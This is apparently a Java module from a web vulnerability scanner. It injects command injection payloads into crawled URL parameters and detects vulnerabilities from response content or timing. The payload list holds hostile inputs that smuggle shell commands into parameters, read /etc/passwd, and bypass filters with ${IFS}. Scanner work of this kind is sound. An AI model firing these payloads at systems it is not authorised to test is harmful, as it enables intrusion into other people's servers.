package dev.ua.ikeepcalm.vynce.tests.impl;

import dev.ua.ikeepcalm.vynce.core.model.ScanContext;
import dev.ua.ikeepcalm.vynce.core.model.source.Severity;
import dev.ua.ikeepcalm.vynce.core.model.source.TestType;
import dev.ua.ikeepcalm.vynce.tests.BaseVulnerabilityTest;
import okhttp3.Response;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;

public class CommandInjectionTest extends BaseVulnerabilityTest {

    private static final List<String> COMMAND_INJECTION_PAYLOADS = Arrays.asList(
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 10 127.0.0.1",
            "| sleep 5",
            "&& sleep 5",
            "; sleep 5 #",
            "\n/bin/ls\n",
            "`sleep 5`",
            "test`echo test`",
            ";${IFS}cat${IFS}/etc/passwd"
    );

    private static final List<String> COMMAND_OUTPUT_INDICATORS = Arrays.asList(
            "uid=", "gid=", "groups=",  // id command
            "root:x:", "daemon:",  // /etc/passwd
            "total ", "drwxr",  // ls command
            "bin", "usr", "etc"  // common directories
    );

    @Override
    public TestType getTestType() {
        return TestType.COMMAND_INJECTION;
    }

    @Override
    protected void runTests(ScanContext context) {
        for (String url : context.getCrawler().getUrlsWithParams()) {
            Map<String, String> params = extractParams(url);
            for (String paramName : params.keySet()) {
                testCommandInjection(context, url, paramName);
            }
        }
    }

    private void testCommandInjection(ScanContext context, String url, String paramName) {
        for (String payload : COMMAND_INJECTION_PAYLOADS) {
            try {
                long startTime = System.currentTimeMillis();
                String testUrl = injectPayload(url, paramName, payload);
                try (Response response = context.getHttpClient().get(testUrl, Collections.emptyMap())) {
                    long duration = System.currentTimeMillis() - startTime;

                    if (response.isSuccessful()) {
                        String body = response.body() != null ? response.body().string() : "";

                        if (containsCommandOutputIndicators(body)) {
                            addVulnerability(createVulnerability(
                                    Severity.CRITICAL,
                                    "Command Injection",
                                    "Parameter '" + paramName + "' is vulnerable to command injection",
                                    url,
                                    payload
                            ));
                            break;
                        }

                        if (payload.contains("sleep") && duration > 4500) {
                            addVulnerability(createVulnerability(
                                    Severity.CRITICAL,
                                    "Command Injection (Time-based)",
                                    "Parameter '" + paramName + "' is vulnerable to command injection (time-based detection)",
                                    url,
                                    payload
                            ));
                            break;
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore errors
            }
        }
    }

    private boolean containsCommandOutputIndicators(String body) {
        for (String indicator : COMMAND_OUTPUT_INDICATORS) {
            if (body.contains(indicator)) {
                return true;
            }
        }
        return false;
    }
}
